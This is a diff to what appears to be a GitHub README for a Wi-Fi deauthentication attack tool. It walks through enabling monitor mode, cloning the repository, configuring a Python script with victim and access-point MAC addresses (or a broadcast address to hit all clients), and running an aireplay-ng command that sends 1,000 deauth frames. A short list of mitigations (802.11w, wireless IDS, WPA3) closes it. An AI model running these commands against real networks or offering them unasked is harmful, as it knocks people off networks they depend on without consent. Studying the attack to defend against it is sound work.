@@ -47,3 +47,43 @@ Ensure your Wi-Fi adapter supports monitor mode. Activate it:
 
 ```bash
 sudo airmon-ng start wlan0
+
+## 2. Install Python Dependencies
+
+Clone this repository and install Scapy:
+
+```bash
+git clone https://github.com/<YourUsername>/Wireless-Deauth-Attack.git
+cd Wireless-Deauth-Attack
+pip install -r requirements.txt
+
+💻 Usage (Python Script)
+Edit deauth_attack.py:
+
+interface: Your monitor mode interface (e.g., wlan0mon)
+
+target_client: Victim MAC address (or FF:FF:FF:FF:FF:FF to target all clients)
+
+ap_mac: Access Point MAC address
+
+Run the script:
+
+bash
+Copy
+Edit
+sudo python3 deauth_attack.py
+🔧 Alternative CLI-Based Attack
+Using aireplay-ng:
+
+bash
+Copy
+Edit
+sudo aireplay-ng --deauth 1000 -a <AP_MAC> -c <Client_MAC> wlan0mon
+Replace <AP_MAC> with the router/AP MAC address.
+
+Replace <Client_MAC> with the client device MAC or leave blank for broadcast.
+
+🛡️ Mitigation Techniques Explored
+✅ Implementing 802.11w Management Frame Protection (MFP)
+✅ Using Wireless IDS/IPS to detect rogue deauth frames
+✅ Enabling client isolation and strong WPA2/WPA3 configurations
